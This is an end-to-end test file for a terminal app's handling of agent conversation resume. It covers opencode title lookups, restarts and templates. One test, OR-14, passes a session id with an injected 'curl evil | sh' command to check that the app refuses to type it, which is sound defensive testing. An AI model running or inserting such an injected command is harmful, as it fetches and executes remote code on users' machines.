/**
 * Picking an opencode conversation back up — the one THIS terminal had.
 *
 * Until 2026-10-05 a terminal offered its agent back after a restart only
 * when NexTerm had started it (New opencode Terminal), and for opencode the
 * offer could only be "the most recent conversation in this folder": opencode
 * has no flag to choose an id up front, and two terminals on one folder both
 * landed on the same one. Measured then, opencode 1.18.34 names the
 * conversation it shows in the terminal's title (`OC | <title>`), and
 * `opencode session list --format json` maps a title to an id. So now:
 *
 * - an agent typed by hand at a prompt is remembered like one NexTerm started
 *   (and ended the same way, by its own exit);
 * - an opencode terminal's title is looked up (`agent_sessions`, narrowed to
 *   the terminal's directory) and the id kept, so the resume is `opencode -s
 *   <id>` — exact — and survives a restart;
 * - the banner can list the folder's conversations to pick another one.
 *
 * The backend is the browser mock here: `mockBridge.agentSessions` stands in
 * for `opencode session list`, `pty-title` events for what the backend reads
 * from the terminal's output. Writes to the terminal are held, as a shell
 * running a program holds them.
 */
import { describe, test, assert } from '../e2e/harness/testFramework.js';
import { serializeAgent, startCommand } from '../../src/lib/agents.js';
import { suggestStartupCommand } from '../../src/lib/startupCommands.js';
import * as terminalStore from '../../src/stores/terminalStore.js';
import { mockBridge } from '../../src/lib/ipc.js';
import { SCHEMA_VERSION } from '../../src/lib/persistence.js';

const T = terminalStore.useTerminalStore;
const { PERSIST_KEY } = terminalStore;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const tabById = (id) => T.getState().tabs.find((t) => t.id === id);

const UUID = 'd4bef4d0-c043-40ef-b157-640fb31ac0ea';
const SES_A = 'ses_aaaaaaaaaaaaAAAAAAAAAAAAAA';
const SES_B = 'ses_bbbbbbbbbbbbBBBBBBBBBBBBBB';
const SES_OLD = 'ses_oooooooooooOLDOLDOLDOLDOLD';
const SES_NEW = 'ses_nnnnnnnnnnnNEWNEWNEWNEWNEW';
const LONG = 'Fix the login bug in the OAuth callback handler';
/** What opencode puts in the terminal's title for a conversation called `title`. */
const ocTitle = (title) => `OC | ${title.length > 40 ? `${title.slice(0, 37)}\u2026` : title}`;

/** The shell drew a prompt: the D its integration sends with every one. */
const prompt = (tab, exitCode = 0) =>
  mockBridge.emit('pty-command-done', { session_id: tab.sessionId, exit_code: exitCode });
/** The shell started running the line: OSC 133 C. */
const started = (tab) => mockBridge.emit('pty-command-started', { session_id: tab.sessionId });
/** A program set the window title (read by the backend from its output). */
const titled = (tab, title) => mockBridge.emit('pty-title', { session_id: tab.sessionId, title });

/** Typed key by key, then Enter — the path every keystroke takes. */
async function typeLine(tabId, text) {
  for (const key of text) await T.getState().writeRaw(tabId, key);
  await T.getState().writeRaw(tabId, '\r');
}

/**
 * `fn` with the terminal's writes held (nothing answers them) and every
 * `agent_sessions` call counted — optionally answered late (`delayMs`, or one
 * delay per call in order), or refused.
 */
async function withBackend({ delayMs = 0, fail = null } = {}, fn) {
  const original = mockBridge.invoke;
  const calls = { writes: [], lookups: [] };
  mockBridge.invoke = async function (command, args, ...rest) {
    if (command === 'pty_write') {
      calls.writes.push(args?.data);
      return null;
    }
    if (command === 'agent_sessions') {
      const nth = calls.lookups.length;
      calls.lookups.push({ ...args });
      const wait = Array.isArray(delayMs) ? delayMs[nth] ?? 0 : delayMs;
      if (wait) await sleep(wait);
      if (fail) throw new Error(fail);
    }
    return original.call(this, command, args, ...rest);
  };
  try {
    await fn(calls);
  } finally {
    mockBridge.invoke = original;
  }
  return calls;
}

/** Scope a store test hook to `fn`. */
async function withHook(name, value, fn) {
  const previous = terminalStore[name](value);
  try {
    await fn();
  } finally {
    terminalStore[name](previous);
  }
}
/** Lookups after 5 ms of quiet rather than 400. */
const quickly = (fn) => withHook('__setAgentResolveDelayMs', 5, fn);
/** Long enough for a lookup to be made and answered. */
const settle = () => sleep(40);

/** A terminal whose shell has drawn its first prompt. */
async function readyTerminal() {
  await T.getState().init();
  const tab = await T.getState().createTab();
  assert.ok(tab, 'setup: a terminal');
  await prompt(tab);
  return tabById(tab.id);
}

/** The conversations `opencode session list` would print. */
function conversations(list) {
  mockBridge.agentSessions = list;
}

// ---- A disk of our own, for the cases that relaunch -----------------------

const backing = new Map();
const shim = {
  getItem: (k) => (backing.has(k) ? backing.get(k) : null),
  setItem: (k, v) => backing.set(k, String(v)),
  removeItem: (k) => backing.delete(k),
  clear: () => backing.clear(),
};
const onDisk = () => {
  const raw = backing.get(PERSIST_KEY);
  return raw ? JSON.parse(raw).data : null;
};

async function withOwnDisk(fn) {
  const borrowed = globalThis.localStorage;
  globalThis.localStorage = shim;
  try {
    await fn();
  } finally {
    T.getState().dispose();
    globalThis.localStorage = borrowed;
  }
}

async function relaunch({ seed = null } = {}) {
  T.getState().dispose();
  if (seed) {
    backing.clear();
    backing.set(PERSIST_KEY, JSON.stringify({ version: SCHEMA_VERSION, data: seed }));
  }
  T.setState({ tabs: [], activeTabId: null, isInitialized: false });
  await T.getState().init();
}

const workspaceRunning = (agent, cwd = '/workspace') => ({
  workspaceName: 'Default',
  activeGroupId: 'group-agent',
  groups: [
    {
      id: 'group-agent', name: 'Agents', createdAt: 1, activePaneId: 'pane-agent',
      tree: { type: 'leaf', id: 'pane-agent', tabIds: ['tab-agent'], activeTabId: 'tab-agent' },
    },
  ],
  tabs: [{ id: 'tab-agent', title: 'Terminal 1', cwd, agent }],
});

async function closeAll() {
  for (const t of [...T.getState().tabs]) await T.getState().closeTab(t.id);
  mockBridge.agentSessions = [];
}

describe('An agent typed by hand is remembered like one NexTerm started', () => {
  test('OR-01: `opencode` typed at a prompt is recorded, watched, and ended by its own exit', async () => {
    const tab = await readyTerminal();
    try {
      await withBackend({}, async () => {
        await typeLine(tab.id, 'opencode');
      });
      let t = tabById(tab.id);
      assert.equal(t.agent?.kind, 'opencode');
      assert.equal(t.agent.sessionId, null, 'which conversation is not known yet');
      assert.equal(t.agentResumeOffered, false);
      assert.deepEqual(t.agentTyped, { sessionId: tab.sessionId }, 'watched from this line on');
      assert.equal(serializeAgent(t.agent).kind, 'opencode', 'what a restart would offer back');

      await started(tab);
      assert.equal(tabById(tab.id).agent?.kind, 'opencode', 'running');
      await prompt(tab);
      t = tabById(tab.id);
      assert.equal(t.agent, null, 'its exit ends the record, as for an agent NexTerm started');
    } finally {
      await closeAll();
    }
  });

  test('OR-02: a shell that has never reported a command\'s end keeps nothing — nothing could ever end it', async () => {
    await T.getState().init();
    const tab = await T.getState().createTab();
    try {
      await withBackend({}, async () => {
        await typeLine(tab.id, 'opencode');
      });
      const t = tabById(tab.id);
      assert.equal(t.agent ?? null, null);
      assert.equal(t.commandLine, 'opencode', 'the line is still followed for templates');
    } finally {
      await closeAll();
    }
  });

  test('OR-03: started by hand while the offer shows, the new agent replaces the offer', async () => {
    const tab = await readyTerminal();
    try {
      T.setState((s) => ({
        tabs: s.tabs.map((t) =>
          t.id === tab.id
            ? { ...t, agent: { kind: 'opencode', sessionId: SES_OLD, startedAt: 1, title: 'Old one' }, agentResumeOffered: true }
            : t
        ),
      }));
      await withBackend({}, async () => {
        await typeLine(tab.id, 'opencode -c');
      });
      const t = tabById(tab.id);
      assert.equal(t.agentResumeOffered, false, 'the offer is gone');
      assert.equal(t.agent.kind, 'opencode');
      assert.equal(t.agent.sessionId, null, 'not the old conversation: -c is the latest, whichever it is');
      assert.equal(t.agent.title, null);
    } finally {
      await closeAll();
    }
  });

  test('OR-04: NexTerm\'s own lines are not taken for typed ones — claude keeps the id it was started with', async () => {
    const tab = await readyTerminal();
    try {
      let agent;
      const { writes } = await withBackend({}, async () => {
        agent = await T.getState().startAgent(tab.id, 'claude');
      });
      assert.deepEqual(writes, [`claude --session-id ${agent.sessionId}\r`]);
      assert.equal(tabById(tab.id).agent.sessionId, agent.sessionId);
      assert.equal(tabById(tab.id).agent.startedAt, agent.startedAt, 'the same record, not a new one');
    } finally {
      await closeAll();
    }
  });

  test('OR-05: a line that names its conversation is remembered with it', async () => {
    const tab = await readyTerminal();
    try {
      await withBackend({}, async () => {
        await typeLine(tab.id, `opencode -s ${SES_A}`);
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
      await started(tab);
      await prompt(tab);

      await withBackend({}, async () => {
        await typeLine(tab.id, `claude --resume ${UUID}`);
      });
      assert.deepEqual(
        { kind: tabById(tab.id).agent.kind, sessionId: tabById(tab.id).agent.sessionId },
        { kind: 'claude', sessionId: UUID }
      );
    } finally {
      await closeAll();
    }
  });
});

describe('An opencode terminal learns which conversation it shows', () => {
  test('OR-06: its title is looked up in its own directory, and the id and full title are kept', async () => {
    const tab = await readyTerminal();
    try {
      conversations([
        { id: SES_A, title: LONG, updated: 200, created: 100, directory: tab.cwd },
        { id: SES_B, title: 'Something else', updated: 300, created: 250, directory: tab.cwd },
        { id: 'ses_ccccccccccccELSEWHEREELSEW', title: LONG, updated: 999, created: 998, directory: '/elsewhere' },
      ]);
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OpenCode'); // its home screen: no conversation yet
          await settle();
          assert.equal(tabById(tab.id).agent.sessionId, null);
          await titled(tab, ocTitle(LONG)); // cut to 37 + …
          await settle();
        });
        assert.deepEqual(lookups, [{ kind: 'opencode', cwd: tab.cwd }], 'one lookup, for the terminal\'s directory');
      });
      const agent = tabById(tab.id).agent;
      assert.equal(agent.sessionId, SES_A, 'the directory\'s own, not the newer one elsewhere');
      assert.equal(agent.title, LONG, 'the full title, not the cut one');
      const stored = serializeAgent(agent);
      assert.equal(stored.sessionId, SES_A);
      assert.equal(stored.title, LONG);
    } finally {
      await closeAll();
    }
  });

  test('OR-07: the same title again, its home screen and its exit title cost no lookup and change nothing', async () => {
    const tab = await readyTerminal();
    try {
      conversations([{ id: SES_A, title: 'Hello', updated: 1, created: 1, directory: tab.cwd }]);
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          for (let i = 0; i < 4; i += 1) await titled(tab, 'OC | Hello'); // redrawn
          await settle();
          await titled(tab, 'OC | Hello');
          await titled(tab, 'OpenCode');
          await titled(tab, '');
          await titled(tab, 'zsh — ~/project'); // another program's
          await settle();
        });
        assert.equal(lookups.length, 1);
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
      assert.equal(tabById(tab.id).agent.title, 'Hello');
    } finally {
      await closeAll();
    }
  });

  test('OR-08: switching conversations inside opencode moves the record with it — and back', async () => {
    const tab = await readyTerminal();
    try {
      conversations([
        { id: SES_A, title: 'First', updated: 10, created: 1, directory: tab.cwd },
        { id: SES_B, title: 'Second', updated: 20, created: 2, directory: tab.cwd },
      ]);
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OC | First');
          await settle();
          assert.equal(tabById(tab.id).agent.sessionId, SES_A);
          await titled(tab, 'OC | Second');
          // Until the lookup answers, the old id must not stand for the new title.
          assert.equal(tabById(tab.id).agent.sessionId, null, 'a stale id outlived the switch');
          assert.equal(tabById(tab.id).agent.title, 'Second');
          await settle();
          assert.equal(tabById(tab.id).agent.sessionId, SES_B);
          await titled(tab, 'OC | First');
          await settle();
        });
        assert.equal(lookups.length, 3);
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
    } finally {
      await closeAll();
    }
  });

  test('OR-09: opened with -s, an older conversation keeps its own id although a newer one has the same title', async () => {
    const tab = await readyTerminal();
    try {
      conversations([
        { id: SES_OLD, title: 'Hello from the mock.', updated: 100, created: 90, directory: tab.cwd },
        { id: SES_NEW, title: 'Hello from the mock.', updated: 900, created: 890, directory: tab.cwd },
      ]);
      await quickly(async () => {
        await withBackend({}, async () => {
          await typeLine(tab.id, `opencode -s ${SES_OLD}`);
          await started(tab);
          await titled(tab, 'OC | Hello from the mock.');
          assert.equal(tabById(tab.id).agent.sessionId, SES_OLD, 'not dropped while it is looked up');
          await settle();
        });
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_OLD);
      assert.equal(tabById(tab.id).agent.title, 'Hello from the mock.');
    } finally {
      await closeAll();
    }
  });

  test('OR-10: a lookup answered after a newer title, or after opencode exited, writes nothing', async () => {
    const tab = await readyTerminal();
    try {
      conversations([
        { id: SES_A, title: 'First', updated: 10, created: 1, directory: tab.cwd },
        { id: SES_B, title: 'Second', updated: 20, created: 2, directory: tab.cwd },
      ]);
      await quickly(async () => {
        // The lookup for the older title answers LAST.
        await withBackend({ delayMs: [150, 10] }, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OC | First');
          await sleep(20); // its lookup is under way
          await titled(tab, 'OC | Second');
          await sleep(60);
          assert.equal(tabById(tab.id).agent.sessionId, SES_B, 'setup: the newer title\'s answer came first');
          await sleep(150);
        });
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_B, 'the slower answer for the older title won');
      assert.equal(tabById(tab.id).agent.title, 'Second');

      await quickly(async () => {
        await withBackend({ delayMs: 60 }, async () => {
          await titled(tab, 'OC | First');
          await sleep(20);
          await prompt(tab); // opencode exits while the lookup is out
          await sleep(150);
        });
      });
      assert.equal(tabById(tab.id).agent, null, 'a late answer brought the record back');
    } finally {
      await closeAll();
    }
  });

  test('OR-11: a lookup that fails leaves the folder\'s latest as the resume, and says so once', async () => {
    const tab = await readyTerminal();
    const warn = console.warn;
    const warned = [];
    console.warn = (...args) => warned.push(args.join(' '));
    try {
      await quickly(async () => {
        await withBackend({ fail: 'opencode was not found on PATH' }, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OC | First');
          await settle();
          await titled(tab, 'OC | Second');
          await settle();
        });
      });
      const agent = tabById(tab.id).agent;
      assert.equal(agent.sessionId, null);
      assert.equal(agent.title, 'Second', 'the title is still worth showing');
      assert.ok(warned.length <= 1, `reported ${warned.length} times`);
    } finally {
      console.warn = warn;
      await closeAll();
    }
  });

  test('OR-12: titles only matter while opencode runs there — not for claude, not for a plain shell, not for an offer', async () => {
    const tab = await readyTerminal();
    try {
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await titled(tab, 'OC | Looks like opencode'); // a plain shell
          await typeLine(tab.id, 'claude');
          await started(tab);
          await titled(tab, 'OC | Still not opencode');
          await settle();
          await prompt(tab);
          T.setState((s) => ({
            tabs: s.tabs.map((t) =>
              t.id === tab.id ? { ...t, agent: { kind: 'opencode', sessionId: null, startedAt: 1, title: null }, agentResumeOffered: true } : t
            ),
          }));
          await titled(tab, 'OC | An offer is not a running agent');
          await settle();
        });
        assert.deepEqual(lookups, []);
      });
      assert.equal(tabById(tab.id).agent.title, null);
    } finally {
      await closeAll();
    }
  });
});

describe('Started again in the same terminal', () => {
  test('OR-18: quit and continued into the same conversation, the new record learns its id afresh', async () => {
    const tab = await readyTerminal();
    try {
      conversations([{ id: SES_A, title: 'Same one', updated: 1, created: 1, directory: tab.cwd }]);
      await quickly(async () => {
        const { lookups } = await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, 'OC | Same one');
          await settle();
          assert.equal(tabById(tab.id).agent.sessionId, SES_A);
          await titled(tab, ''); // as it quits
          await prompt(tab);
          assert.equal(tabById(tab.id).agent, null);

          await typeLine(tab.id, 'opencode -c');
          await started(tab);
          assert.equal(tabById(tab.id).agent.sessionId, null, 'a new record');
          await titled(tab, 'OC | Same one'); // the title the last record already saw
          await settle();
        });
        assert.equal(lookups.length, 2, 'the second record looked its title up too');
      });
      assert.equal(tabById(tab.id).agent.sessionId, SES_A);
    } finally {
      await closeAll();
    }
  });
});

describe('After a restart, that conversation is offered back', () => {
  test('OR-13: the id and title reach the disk, come back offered, and resume exactly — with no lookup', async () => {
    await withOwnDisk(async () => {
      await relaunch({ seed: workspaceRunning(null) });
      const tab = T.getState().tabs[0];
      await prompt(tab);
      conversations([{ id: SES_A, title: LONG, updated: 5, created: 1, directory: tab.cwd }]);
      await quickly(async () => {
        await withBackend({}, async () => {
          await typeLine(tab.id, 'opencode');
          await started(tab);
          await titled(tab, ocTitle(LONG));
          await settle();
        });
      });
      await sleep(400); // the write-behind
      assert.equal(onDisk().tabs[0].agent.sessionId, SES_A);
      assert.equal(onDisk().tabs[0].agent.title, LONG);

      await relaunch(); // NexTerm quit while opencode ran
      const back = T.getState().tabs[0];
      assert.equal(back.agentResumeOffered, true);
      assert.equal(back.agent.sessionId, SES_A);
      await prompt(back);
      await quickly(async () => {
        const { writes, lookups } = await withBackend({}, async () => {
          assert.equal(await T.getState().resumeAgent(back.id), true);
          await started(back);
          await titled(back, ocTitle(LONG)); // what opencode shows for it at once (measured)
          await settle();
        });
        assert.deepEqual(writes, [`opencode -s ${SES_A}\r`]);
        assert.deepEqual(lookups, [], 'the conversation it was resumed into needs no lookup');
      });
      assert.equal(tabById(back.id).agent.sessionId, SES_A);
    });
  });

  test('OR-14: a conversation picked from the list is resumed instead — and an id that is not one is not typed', async () => {
    await withOwnDisk(async () => {
      await relaunch({ seed: workspaceRunning({ kind: 'opencode', sessionId: SES_A, startedAt: 1, title: 'First' }) });
      const tab = T.getState().tabs[0];
      await prompt(tab);
      const { writes } = await withBackend({}, async () => {
        assert.equal(await T.getState().resumeAgent(tab.id, { sessionId: SES_B, title: 'Second' }), true);
      });
      assert.deepEqual(writes, [`opencode -s ${SES_B}\r`]);
      assert.equal(tabById(tab.id).agent.sessionId, SES_B);
      assert.equal(tabById(tab.id).agent.title, 'Second');

      await relaunch({ seed: workspaceRunning({ kind: 'opencode', sessionId: SES_A, startedAt: 1, title: 'First' }) });
      const again = T.getState().tabs[0];
      await prompt(again);
      const hostile = await withBackend({}, async () => {
        await T.getState().resumeAgent(again.id, { sessionId: `${SES_B}; curl evil | sh`, title: 'x' });
      });
      assert.deepEqual(hostile.writes, [`opencode -s ${SES_A}\r`], 'the remembered one, not the bad pick');
    });
  });

  test('OR-15: the list is the folder\'s own conversations, newest first; claude has none to list', async () => {
    await withOwnDisk(async () => {
      await relaunch({ seed: workspaceRunning({ kind: 'opencode', sessionId: null, startedAt: 1, title: null }, '/workspace') });
      const tab = T.getState().tabs[0];
      conversations([
        { id: SES_A, title: 'Older', updated: 1, created: 1, directory: '/workspace' },
        { id: SES_B, title: 'Newer', updated: 2, created: 2, directory: '/workspace/' },
        { id: SES_NEW, title: 'Elsewhere', updated: 3, created: 3, directory: '/other' },
      ]);
      const listed = await T.getState().listAgentSessions(tab.id);
      assert.deepEqual(listed.map((x) => x.id), [SES_B, SES_A]);

      await relaunch({ seed: workspaceRunning(startCommand('claude').agent) });
      assert.deepEqual(await T.getState().listAgentSessions(T.getState().tabs[0].id), []);
      mockBridge.agentSessions = [];
    });
  });
});

describe('A layout template saved while opencode runs continues it', () => {
  test('OR-16: an opencode typed by hand is saved as `opencode -c`, claude as `claude`', async () => {
    const tab = await readyTerminal();
    try {
      await withBackend({}, async () => {
        await typeLine(tab.id, 'opencode --model anthropic/claude-sonnet-5');
        await started(tab);
      });
      assert.equal(suggestStartupCommand(tabById(tab.id)), 'opencode -c');
      await prompt(tab);
      await withBackend({}, async () => {
        await typeLine(tab.id, `claude --resume ${UUID}`);
        await started(tab);
      });
      assert.equal(suggestStartupCommand(tabById(tab.id)), 'claude', 'never the id, which is in use');
    } finally {
      await closeAll();
    }
  });

  test('OR-17: teardown — nothing left looking anything up', async () => {
    await sleep(50);
    mockBridge.agentSessions = [];
    assert.equal(T.getState().tabs.some((t) => t.agent?.kind === 'opencode' && !t.agentResumeOffered), false);
  });
});
